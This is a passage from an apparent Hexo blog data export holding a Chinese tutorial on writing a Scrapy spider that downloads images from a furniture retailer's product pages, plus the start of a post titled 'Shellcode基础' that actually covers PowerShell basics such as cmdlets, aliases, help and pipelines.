Chrome/53.0.2785.143 Safari/537.36',\n    }\n    \n    def get_media_requests(self,item,info):\n        #这里是重写父类ImagesPipeline的对应方法，建议对照父类代码理解\n        #我这里item中的srcurl是用xpath获取的数组，所以要遍历取每个值\n        for each in item['srcurl']:\n            #注意最后这个meta，因为file_path中没传入item，所以想用的话可以通过这种方式传过去给file-path 使用\n            yield scrapy.Request(each,headers = self.myheaders,meta={'item':item})\n\n    def file_path(self, request, response=None, info=None):\n        image_guid = request.url.split(\"/\")[-1].split('.')[0]\n        #前一个表示目录，后一个表示保存的文件名\n        path = \"{}/{}.jpg\".format(request.meta['item']['title'][0],image_guid)\n        return path\n```\n### settings.py\n\n```python\n#settings.py\nimport os\n#使用ImagesPipeline 下载的文件保存在这，名字不能乱改\nIMAGES_STORE = os.path.join(os.path.dirname(os.path.dirname(__file__)),'Sofo_images')\n#关闭机器人协议，否则某些网站会获取不到数据\nROBOTSTXT_OBEY = False\n\n#这个很重要，默认是未开启的，也就是默认SsofaPipeline中的代码不执行，需要在这接触注释\nITEM_PIPELINES = {\n   'sSofa.pipelines.SsofaPipeline': 1,\n}\n\n\n# 可以在这设置默认request headers\n# DEFAULT_REQUEST_HEADERS = {\n#             'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',\n#             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n#             \"Accept-Language\": \"zh-CN,zh;q=0.9,en-US;q=0.5,en;q=0.3\",\n#             \"Accept-Encoding\": \"gzip, deflate\",\n#             'Content-Length': '0',\n#             \"Connection\": \"keep-alive\"\n#             }\n```\n\n### 执行\n\n爬虫名是在`spiders/example.py`中`name`设置的\n\n命令行运行\n\n`scrapy crawl example`\n\n脚本运行\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute('scrapy crawl example'.split())\n```\n\n网上还有很多其他运行方式","source":"_posts/muuto_scrapy框架爬虫.md","raw":"---\ntitle: muuto_scrapy爬虫\ntags: [爬虫]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png\ndate: 2020-7-4\n---\n\n\n本项目是爬取一个家具网站的部分数据\n\n目标站：https://muuto.com/furniture\n\n### 前言\n\n本爬虫使用scrapy框架\n\n框架大概流程如下\n\n![image-20200705164322714](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png)\n\n配图来源：https://doc.scrapy.org/en/master/topics/architecture.html\n\n#### 下载样式\n\n保存格式如下\n\n![image-20200705164404797](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164404797.png)\n\n\n\n### 生成新对象\n\n```shell\nscrapy startproject sSofo\t\t\n```\n\n创建一个scrapy空对象，方便后期使用\n\n### 使用通用模板创建一个spider\n\n```shell\n  #scrapy genspidere [options] <name> <domain>\n  scrapy genspidere xxxx xxxx.com\n```\n\n### 详细配置文件\n\n上面生成默认配置文件后，下面贴出我修改的文件，没贴出的代码都默认处理\n\n#### item.py\n\n```python\n#item.py\nimport scrapy\n\nclass SsofaItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    srcurl = scrapy.Field()\n    videourl = scrapy.Field()\n    title = scrapy.Field() \n```\n\n#### spiders/example.py\n\n```python\n#spiders/example.py\nimport scrapy\nfrom sSofa.items import SsofaItem\n\nclass ExampleSpider(scrapy.Spider):\n    name = 'example'\n    myheaders = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',\n    }\n\n    def start_requests(self):\n        #爬虫开始运行执行的第一个函数\n        purl = \"https://muuto.com/furniture\"\n        yield scrapy.Request(purl,headers = self.myheaders)\n\n    def parse(self, response):\n        #默认第一次返回的response处理函数\n        div_xapth_list = response.xpath(\"//a[@class='product photo product-item-photo']/@href\").extract()\n        for each in div_xapth_list:\n            # 注意下面的callback是sec_page，所以返回的数据就到下面去处理\n            yield scrapy.Request(each,headers = self.myheaders,callback = self.sec_page)\n\n    def sec_page(self,response):\n        #处理第二次request返回的数据\n        \n        #item在这个框架中可以认为是一个全局变量一样的东西，给各个模块之间使用数据（个人理解）\n        item = SsofaItem()\n\n        title = response.xpath(\"//span[@data-ui-id='page-title-wrapper']/text()\").extract()\n        item['title'] = title \n        \n        source_video = response.xpath(\"//section[@id='video-unbranded']//iframe[@id='player']/@src\").extract()\n        item['videourl'] = source_video\n\n        xpathfilter =\"//section[@id='fifty-fifty-image-slider-text']//img/@src | //section[@id='brand-images']//img/@src | //section[@id='designer']//img/@src\"\n        srcurl = response.xpath(xpathfilter).extract()\n        item['srcurl'] = srcurl\n\n        # srcurl = response.xpath(\"//section[@id='fifty-fifty-image-slider-text']//img/@src\").extract()\n        # item['srcurl'] = srcurl\n\n        # brand_images = response.xpath(\"//section[@id='brand-images']//img/@src\").extract()\n        # item['srcurl'].append(brand_images)\n\n        # designer = response.xpath(\"//section[@id='designer']//img/@src\").extract()\n        # item['srcurl'].append(designer)\n\n        #这里返回item后，如果没有开启pipelimes，就到这里结束\n        #如果打开后，就去执行pipelimes中的代码\n        yield item\n```\n#### pipelines.py\n\n```python\n#pipelines.py\nimport scrapy\nfrom scrapy.pipelines.images import ImagesPipeline\n\n#注意这个类是继承自ImagesPipeline 而不是 object \nclass SsofaPipeline(ImagesPipeline):\n\n    myheaders = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',\n    }\n    \n    def get_media_requests(self,item,info):\n        #这里是重写父类ImagesPipeline的对应方法，建议对照父类代码理解\n        #我这里item中的srcurl是用xpath获取的数组，所以要遍历取每个值\n        for each in item['srcurl']:\n            #注意最后这个meta，因为file_path中没传入item，所以想用的话可以通过这种方式传过去给file-path 使用\n            yield scrapy.Request(each,headers = self.myheaders,meta={'item':item})\n\n    def file_path(self, request, response=None, info=None):\n        image_guid = request.url.split(\"/\")[-1].split('.')[0]\n        #前一个表示目录，后一个表示保存的文件名\n        path = \"{}/{}.jpg\".format(request.meta['item']['title'][0],image_guid)\n        return path\n```\n### settings.py\n\n```python\n#settings.py\nimport os\n#使用ImagesPipeline 下载的文件保存在这，名字不能乱改\nIMAGES_STORE = os.path.join(os.path.dirname(os.path.dirname(__file__)),'Sofo_images')\n#关闭机器人协议，否则某些网站会获取不到数据\nROBOTSTXT_OBEY = False\n\n#这个很重要，默认是未开启的，也就是默认SsofaPipeline中的代码不执行，需要在这接触注释\nITEM_PIPELINES = {\n   'sSofa.pipelines.SsofaPipeline': 1,\n}\n\n\n# 可以在这设置默认request headers\n# DEFAULT_REQUEST_HEADERS = {\n#             'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',\n#             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n#             \"Accept-Language\": \"zh-CN,zh;q=0.9,en-US;q=0.5,en;q=0.3\",\n#             \"Accept-Encoding\": \"gzip, deflate\",\n#             'Content-Length': '0',\n#             \"Connection\": \"keep-alive\"\n#             }\n```\n\n### 执行\n\n爬虫名是在`spiders/example.py`中`name`设置的\n\n命令行运行\n\n`scrapy crawl example`\n\n脚本运行\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute('scrapy crawl example'.split())\n```\n\n网上还有很多其他运行方式","slug":"muuto_scrapy框架爬虫","published":1,"updated":"2020-07-05T08:46:33.521Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62v001bccuq67j8kg6v","content":"<p>本项目是爬取一个家具网站的部分数据</p>\n<p>目标站：<a href=\"https://muuto.com/furniture\" target=\"_blank\" rel=\"noopener\">https://muuto.com/furniture</a></p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本爬虫使用scrapy框架</p>\n<p>框架大概流程如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200705164322714\"></p>\n<p>配图来源：<a href=\"https://doc.scrapy.org/en/master/topics/architecture.html\" target=\"_blank\" rel=\"noopener\">https://doc.scrapy.org/en/master/topics/architecture.html</a></p>\n<h4 id=\"下载样式\"><a href=\"#下载样式\" class=\"headerlink\" title=\"下载样式\"></a>下载样式</h4><p>保存格式如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164404797.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200705164404797\"></p>\n<h3 id=\"生成新对象\"><a href=\"#生成新对象\" class=\"headerlink\" title=\"生成新对象\"></a>生成新对象</h3><pre><code class=\"shell\">scrapy startproject sSofo        </code></pre>\n<p>创建一个scrapy空对象，方便后期使用</p>\n<h3 id=\"使用通用模板创建一个spider\"><a href=\"#使用通用模板创建一个spider\" class=\"headerlink\" title=\"使用通用模板创建一个spider\"></a>使用通用模板创建一个spider</h3><pre><code class=\"shell\">  #scrapy genspidere [options] &lt;name&gt; &lt;domain&gt;\n  scrapy genspidere xxxx xxxx.com</code></pre>\n<h3 id=\"详细配置文件\"><a href=\"#详细配置文件\" class=\"headerlink\" title=\"详细配置文件\"></a>详细配置文件</h3><p>上面生成默认配置文件后，下面贴出我修改的文件，没贴出的代码都默认处理</p>\n<h4 id=\"item-py\"><a href=\"#item-py\" class=\"headerlink\" title=\"item.py\"></a>item.py</h4><pre><code class=\"python\">#item.py\nimport scrapy\n\nclass SsofaItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    srcurl = scrapy.Field()\n    videourl = scrapy.Field()\n    title = scrapy.Field() </code></pre>\n<h4 id=\"spiders-example-py\"><a href=\"#spiders-example-py\" class=\"headerlink\" title=\"spiders/example.py\"></a>spiders/example.py</h4><pre><code class=\"python\">#spiders/example.py\nimport scrapy\nfrom sSofa.items import SsofaItem\n\nclass ExampleSpider(scrapy.Spider):\n    name = &#39;example&#39;\n    myheaders = {\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,\n    }\n\n    def start_requests(self):\n        #爬虫开始运行执行的第一个函数\n        purl = &quot;https://muuto.com/furniture&quot;\n        yield scrapy.Request(purl,headers = self.myheaders)\n\n    def parse(self, response):\n        #默认第一次返回的response处理函数\n        div_xapth_list = response.xpath(&quot;//a[@class=&#39;product photo product-item-photo&#39;]/@href&quot;).extract()\n        for each in div_xapth_list:\n            # 注意下面的callback是sec_page，所以返回的数据就到下面去处理\n            yield scrapy.Request(each,headers = self.myheaders,callback = self.sec_page)\n\n    def sec_page(self,response):\n        #处理第二次request返回的数据\n\n        #item在这个框架中可以认为是一个全局变量一样的东西，给各个模块之间使用数据（个人理解）\n        item = SsofaItem()\n\n        title = response.xpath(&quot;//span[@data-ui-id=&#39;page-title-wrapper&#39;]/text()&quot;).extract()\n        item[&#39;title&#39;] = title \n\n        source_video = response.xpath(&quot;//section[@id=&#39;video-unbranded&#39;]//iframe[@id=&#39;player&#39;]/@src&quot;).extract()\n        item[&#39;videourl&#39;] = source_video\n\n        xpathfilter =&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src | //section[@id=&#39;brand-images&#39;]//img/@src | //section[@id=&#39;designer&#39;]//img/@src&quot;\n        srcurl = response.xpath(xpathfilter).extract()\n        item[&#39;srcurl&#39;] = srcurl\n\n        # srcurl = response.xpath(&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;] = srcurl\n\n        # brand_images = response.xpath(&quot;//section[@id=&#39;brand-images&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;].append(brand_images)\n\n        # designer = response.xpath(&quot;//section[@id=&#39;designer&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;].append(designer)\n\n        #这里返回item后，如果没有开启pipelimes，就到这里结束\n        #如果打开后，就去执行pipelimes中的代码\n        yield item</code></pre>\n<h4 id=\"pipelines-py\"><a href=\"#pipelines-py\" class=\"headerlink\" title=\"pipelines.py\"></a>pipelines.py</h4><pre><code class=\"python\">#pipelines.py\nimport scrapy\nfrom scrapy.pipelines.images import ImagesPipeline\n\n#注意这个类是继承自ImagesPipeline 而不是 object \nclass SsofaPipeline(ImagesPipeline):\n\n    myheaders = {\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,\n    }\n\n    def get_media_requests(self,item,info):\n        #这里是重写父类ImagesPipeline的对应方法，建议对照父类代码理解\n        #我这里item中的srcurl是用xpath获取的数组，所以要遍历取每个值\n        for each in item[&#39;srcurl&#39;]:\n            #注意最后这个meta，因为file_path中没传入item，所以想用的话可以通过这种方式传过去给file-path 使用\n            yield scrapy.Request(each,headers = self.myheaders,meta={&#39;item&#39;:item})\n\n    def file_path(self, request, response=None, info=None):\n        image_guid = request.url.split(&quot;/&quot;)[-1].split(&#39;.&#39;)[0]\n        #前一个表示目录，后一个表示保存的文件名\n        path = &quot;{}/{}.jpg&quot;.format(request.meta[&#39;item&#39;][&#39;title&#39;][0],image_guid)\n        return path</code></pre>\n<h3 id=\"settings-py\"><a href=\"#settings-py\" class=\"headerlink\" title=\"settings.py\"></a>settings.py</h3><pre><code class=\"python\">#settings.py\nimport os\n#使用ImagesPipeline 下载的文件保存在这，名字不能乱改\nIMAGES_STORE = os.path.join(os.path.dirname(os.path.dirname(__file__)),&#39;Sofo_images&#39;)\n#关闭机器人协议，否则某些网站会获取不到数据\nROBOTSTXT_OBEY = False\n\n#这个很重要，默认是未开启的，也就是默认SsofaPipeline中的代码不执行，需要在这接触注释\nITEM_PIPELINES = {\n   &#39;sSofa.pipelines.SsofaPipeline&#39;: 1,\n}\n\n\n# 可以在这设置默认request headers\n# DEFAULT_REQUEST_HEADERS = {\n#             &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&#39;,\n#             &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n#             &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.5,en;q=0.3&quot;,\n#             &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,\n#             &#39;Content-Length&#39;: &#39;0&#39;,\n#             &quot;Connection&quot;: &quot;keep-alive&quot;\n#             }</code></pre>\n<h3 id=\"执行\"><a href=\"#执行\" class=\"headerlink\" title=\"执行\"></a>执行</h3><p>爬虫名是在<code>spiders/example.py</code>中<code>name</code>设置的</p>\n<p>命令行运行</p>\n<p><code>scrapy crawl example</code></p>\n<p>脚本运行</p>\n<pre><code class=\"python\">from scrapy import cmdline\n\ncmdline.execute(&#39;scrapy crawl example&#39;.split())</code></pre>\n<p>网上还有很多其他运行方式</p>\n","site":{"data":{}},"excerpt":"","more":"<p>本项目是爬取一个家具网站的部分数据</p>\n<p>目标站：<a href=\"https://muuto.com/furniture\" target=\"_blank\" rel=\"noopener\">https://muuto.com/furniture</a></p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本爬虫使用scrapy框架</p>\n<p>框架大概流程如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200705164322714\"></p>\n<p>配图来源：<a href=\"https://doc.scrapy.org/en/master/topics/architecture.html\" target=\"_blank\" rel=\"noopener\">https://doc.scrapy.org/en/master/topics/architecture.html</a></p>\n<h4 id=\"下载样式\"><a href=\"#下载样式\" class=\"headerlink\" title=\"下载样式\"></a>下载样式</h4><p>保存格式如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164404797.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200705164404797\"></p>\n<h3 id=\"生成新对象\"><a href=\"#生成新对象\" class=\"headerlink\" title=\"生成新对象\"></a>生成新对象</h3><pre><code class=\"shell\">scrapy startproject sSofo        </code></pre>\n<p>创建一个scrapy空对象，方便后期使用</p>\n<h3 id=\"使用通用模板创建一个spider\"><a href=\"#使用通用模板创建一个spider\" class=\"headerlink\" title=\"使用通用模板创建一个spider\"></a>使用通用模板创建一个spider</h3><pre><code class=\"shell\">  #scrapy genspidere [options] &lt;name&gt; &lt;domain&gt;\n  scrapy genspidere xxxx xxxx.com</code></pre>\n<h3 id=\"详细配置文件\"><a href=\"#详细配置文件\" class=\"headerlink\" title=\"详细配置文件\"></a>详细配置文件</h3><p>上面生成默认配置文件后，下面贴出我修改的文件，没贴出的代码都默认处理</p>\n<h4 id=\"item-py\"><a href=\"#item-py\" class=\"headerlink\" title=\"item.py\"></a>item.py</h4><pre><code class=\"python\">#item.py\nimport scrapy\n\nclass SsofaItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    srcurl = scrapy.Field()\n    videourl = scrapy.Field()\n    title = scrapy.Field() </code></pre>\n<h4 id=\"spiders-example-py\"><a href=\"#spiders-example-py\" class=\"headerlink\" title=\"spiders/example.py\"></a>spiders/example.py</h4><pre><code class=\"python\">#spiders/example.py\nimport scrapy\nfrom sSofa.items import SsofaItem\n\nclass ExampleSpider(scrapy.Spider):\n    name = &#39;example&#39;\n    myheaders = {\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,\n    }\n\n    def start_requests(self):\n        #爬虫开始运行执行的第一个函数\n        purl = &quot;https://muuto.com/furniture&quot;\n        yield scrapy.Request(purl,headers = self.myheaders)\n\n    def parse(self, response):\n        #默认第一次返回的response处理函数\n        div_xapth_list = response.xpath(&quot;//a[@class=&#39;product photo product-item-photo&#39;]/@href&quot;).extract()\n        for each in div_xapth_list:\n            # 注意下面的callback是sec_page，所以返回的数据就到下面去处理\n            yield scrapy.Request(each,headers = self.myheaders,callback = self.sec_page)\n\n    def sec_page(self,response):\n        #处理第二次request返回的数据\n\n        #item在这个框架中可以认为是一个全局变量一样的东西，给各个模块之间使用数据（个人理解）\n        item = SsofaItem()\n\n        title = response.xpath(&quot;//span[@data-ui-id=&#39;page-title-wrapper&#39;]/text()&quot;).extract()\n        item[&#39;title&#39;] = title \n\n        source_video = response.xpath(&quot;//section[@id=&#39;video-unbranded&#39;]//iframe[@id=&#39;player&#39;]/@src&quot;).extract()\n        item[&#39;videourl&#39;] = source_video\n\n        xpathfilter =&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src | //section[@id=&#39;brand-images&#39;]//img/@src | //section[@id=&#39;designer&#39;]//img/@src&quot;\n        srcurl = response.xpath(xpathfilter).extract()\n        item[&#39;srcurl&#39;] = srcurl\n\n        # srcurl = response.xpath(&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;] = srcurl\n\n        # brand_images = response.xpath(&quot;//section[@id=&#39;brand-images&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;].append(brand_images)\n\n        # designer = response.xpath(&quot;//section[@id=&#39;designer&#39;]//img/@src&quot;).extract()\n        # item[&#39;srcurl&#39;].append(designer)\n\n        #这里返回item后，如果没有开启pipelimes，就到这里结束\n        #如果打开后，就去执行pipelimes中的代码\n        yield item</code></pre>\n<h4 id=\"pipelines-py\"><a href=\"#pipelines-py\" class=\"headerlink\" title=\"pipelines.py\"></a>pipelines.py</h4><pre><code class=\"python\">#pipelines.py\nimport scrapy\nfrom scrapy.pipelines.images import ImagesPipeline\n\n#注意这个类是继承自ImagesPipeline 而不是 object \nclass SsofaPipeline(ImagesPipeline):\n\n    myheaders = {\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,\n    }\n\n    def get_media_requests(self,item,info):\n        #这里是重写父类ImagesPipeline的对应方法，建议对照父类代码理解\n        #我这里item中的srcurl是用xpath获取的数组，所以要遍历取每个值\n        for each in item[&#39;srcurl&#39;]:\n            #注意最后这个meta，因为file_path中没传入item，所以想用的话可以通过这种方式传过去给file-path 使用\n            yield scrapy.Request(each,headers = self.myheaders,meta={&#39;item&#39;:item})\n\n    def file_path(self, request, response=None, info=None):\n        image_guid = request.url.split(&quot;/&quot;)[-1].split(&#39;.&#39;)[0]\n        #前一个表示目录，后一个表示保存的文件名\n        path = &quot;{}/{}.jpg&quot;.format(request.meta[&#39;item&#39;][&#39;title&#39;][0],image_guid)\n        return path</code></pre>\n<h3 id=\"settings-py\"><a href=\"#settings-py\" class=\"headerlink\" title=\"settings.py\"></a>settings.py</h3><pre><code class=\"python\">#settings.py\nimport os\n#使用ImagesPipeline 下载的文件保存在这，名字不能乱改\nIMAGES_STORE = os.path.join(os.path.dirname(os.path.dirname(__file__)),&#39;Sofo_images&#39;)\n#关闭机器人协议，否则某些网站会获取不到数据\nROBOTSTXT_OBEY = False\n\n#这个很重要，默认是未开启的，也就是默认SsofaPipeline中的代码不执行，需要在这接触注释\nITEM_PIPELINES = {\n   &#39;sSofa.pipelines.SsofaPipeline&#39;: 1,\n}\n\n\n# 可以在这设置默认request headers\n# DEFAULT_REQUEST_HEADERS = {\n#             &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&#39;,\n#             &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n#             &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.5,en;q=0.3&quot;,\n#             &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,\n#             &#39;Content-Length&#39;: &#39;0&#39;,\n#             &quot;Connection&quot;: &quot;keep-alive&quot;\n#             }</code></pre>\n<h3 id=\"执行\"><a href=\"#执行\" class=\"headerlink\" title=\"执行\"></a>执行</h3><p>爬虫名是在<code>spiders/example.py</code>中<code>name</code>设置的</p>\n<p>命令行运行</p>\n<p><code>scrapy crawl example</code></p>\n<p>脚本运行</p>\n<pre><code class=\"python\">from scrapy import cmdline\n\ncmdline.execute(&#39;scrapy crawl example&#39;.split())</code></pre>\n<p>网上还有很多其他运行方式</p>\n"},{"title":"Shellcode基础","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302103202.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302103202.png","_content":"\n\n\n\n\n### shellcode 基础\n\n参考微软[官方文档]( https://docs.microsoft.com/zh-cn/powershell/scripting/how-to-use-docs?view=powershell-7 )\n\n几个特性：\n\n> 1. .NET Core可跨平台，powershell6可在Mac Linux平台使用，大气\n> 2. Win10自带组建，功能强大\n\n\n\n#### 了解Powershell\n\n1. 输出基于对象\n   - PowerShell cmdlet 旨在处理对象\n   - 在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分\n2. 命令系列是可扩展的\n   - 可以自己实现函数\n   - 支持批处理文件的脚本\n3. PowerShell 处理控制台输入和显示\n   - 在cmdlet 后使用 **-？**可显示关于此命令的帮助\n4. PowerShell 使用某些 C# 语法\n\n#### 了解powershell的名称\n\n \t1. Cmdlet 使用谓词-名词的名称来减少命令记忆\n     - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 )\n \t2. Cmdlet 使用标准参数\n     - 参数主要通过**-？**获取，还有通用参数如 WhatIf、Confirm、Verbose、Debug、Warn、ErrorAction、ErrorVariable、OutVariable 和 OutBuffer\n\t3. 建议的参数名称\n    -   加上方便人理解： Force 、Exclude 、Include 、PassThru 、Path 和 CaseSensitive \n\n#### 使用熟悉的命令名称\n\n​\t**1. Powershell 支持常见的Unix 和cmd.exe 的命令**\n\n​\t\n\n|       |         |       |       |\n| :---- | :------ | :---- | :---- |\n| cat   | dir     | mount | rm    |\n| cd    | echo    | move  | rmdir |\n| chdir | erase   | popd  | sleep |\n| clear | h       | ps    | sort  |\n| cls   | history | pushd | tee   |\n| copy  | kill    | pwd   | type  |\n| del   | lp      | r     | write |\n| diff  | ls      | ren   |       |\n\n2. 别名相关操作\n\n    ` Get-Command -Noun Alias`\n\n#### 获取详细的帮助信息\n\n1. 获取有关 cmdlet 的帮助\n   - 常规帮助 **Get-Help cmdlet**、**man cmdlet** 、**cmdlet   -?** \n   - 获取到参数的帮助  **Get-Help cmdlet -Full** \n\n#### 使用变量存储对象\n\n1. 使用**$**表示变量\n2. Get-Member $env:获取变量的信息\n    - 可以创建设置键值对，例：` $env:LIB_PATH='/usr/local/lib' `\n\n####  了解 PowerShell 管道\n\n​\t主要是方法和属性的使用，下面举个例子\n\n​\t` Get-Location ` 获取一个pathInfo\n\n​\t`Get-Location | Get-Member`获取这个类的方法和属性\n\n​\t想要使用必须先实例化，传给一个变量\n\n​\t` $myLocal = Get-Location`实例化，这个`$myLocal`拥有`Get-Location`的全部方法和属性\n\n​\t比如`$myloc.Drive.Used `获取所在驱动内存使用大小，通过`Get-Member`获取详情\n\n\n\n#### 术语表\n\npowershell的常用术语\n\n建议中英对照看，翻译的有些不易理解\n\n[中文]( https://docs.microsoft.com/zh-cn/powershell/scripting/learn/windows-powershell-glossary?view=powershell-7 )\n\n[英文](https://docs.microsoft.com/en-us/powershell/scripting/learn/windows-powershell-glossary?view=powershell-77)\n\n","source":"_posts/shellcode基础.md","raw":"---\ntitle: Shellcode基础\ntags: [Shell]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302103202.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302103202.png\n---\n\n\n\n\n\n### shellcode 基础\n\n参考微软[官方文档]( https://docs.microsoft.com/zh-cn/powershell/scripting/how-to-use-docs?view=powershell-7 )\n\n几个特性：\n\n> 1. .NET Core可跨平台，powershell6可在Mac Linux平台使用，大气\n> 2. Win10自带组建，功能强大\n\n\n\n#### 了解Powershell\n\n1. 输出基于对象\n   - PowerShell cmdlet 旨在处理对象\n   - 在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分\n2. 命令系列是可扩展的\n   - 可以自己实现函数\n   - 支持批处理文件的脚本\n3. PowerShell 处理控制台输入和显示\n   - 在cmdlet 后使用 **-？**可显示关于此命令的帮助\n4. PowerShell 使用某些 C# 语法\n\n#### 了解powershell的名称\n\n \t1. Cmdlet 使用谓词-名词的名称来减少命令记忆\n     - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 )\n \t2. Cmdlet 使用标准参数\n     - 参数主要通过**-？**获取，还有通用参数如 WhatIf、Confirm、Verbose、Debug、Warn、ErrorAction、ErrorVariable、OutVariable 和 OutBuffer\n\t3. 建议的参数名称\n    -   加上方便人理解： Force 、Exclude 、Include 、PassThru 、Path 和 CaseSensitive \n\n#### 使用熟悉的命令名称\n\n​\t**1. Powershell 支持常见的Unix 和cmd.exe 的命令**\n\n​\t\n\n|       |         |       |       |\n| :---- | :------ | :---- | :---- |\n| cat   | dir     | mount | rm    |\n| cd    | echo    | move  | rmdir |\n| chdir | erase   | popd  | sleep |\n| clear | h       | ps    | sort  |\n| cls   | history | pushd | tee   |\n| copy  | kill    | pwd   | type  |\n| del   | lp      | r     | write |\n| diff  | ls      | ren   |       |\n\n2. 别名相关操作\n\n    ` Get-Command -Noun Alias`\n\n#### 获取详细的帮助信息\n\n1. 获取有关 cmdlet 的帮助\n   - 常规帮助 **Get-Help cmdlet**、**man cmdlet** 、**cmdlet   -?** \n   - 获取到参数的帮助  **Get-Help cmdlet -Full** \n\n#### 使用变量存储对象\n\n1. 使用**$**表示变量\n2. Get-Member $env:获取变量的信息\n    - 可以创建设置键值对，例：` $env:LIB_PATH='/usr/local/lib' `\n\n####  了解 PowerShell 管道\n\n​\t主要是方法和属性的使用，下面举个例子\n\n​\t` Get-Location ` 获取一个pathInfo\n\n​\t`Get-Location | Get-Member`获取这个类的方法和属性\n\n​\t想要使用必须先实例化，传给一个变量\n\n​\t` $myLocal = Get-Location`实例化，这个`$myLocal`拥有`Get-Location`的全部方法和属性\n\n​\t比如`$myloc.Drive.Used `获取所在驱动内存使用大小，通过`Get-Member`获取详情\n\n\n\n#### 术语表\n\npowershell的常用术语\n\n建议中英对照看，翻译的有些不易理解\n\n[中文]( https://docs.microsoft.com/zh-cn/powershell/scripting/learn/windows-powershell-glossary?view=powershell-7 )\n\n[英文](https://docs.microsoft.com/en-us/powershell/scripting/learn/windows-powershell-glossary?view=powershell-77)\n\n","slug":"shellcode基础","published":1,"date":"2020-03-02T02:22:10.834Z","updated":"2020-03-03T06:59:09.919Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62w001fccuq9mmibr93","content":"<h3 id=\"shellcode-基础\"><a href=\"#shellcode-基础\" class=\"headerlink\" 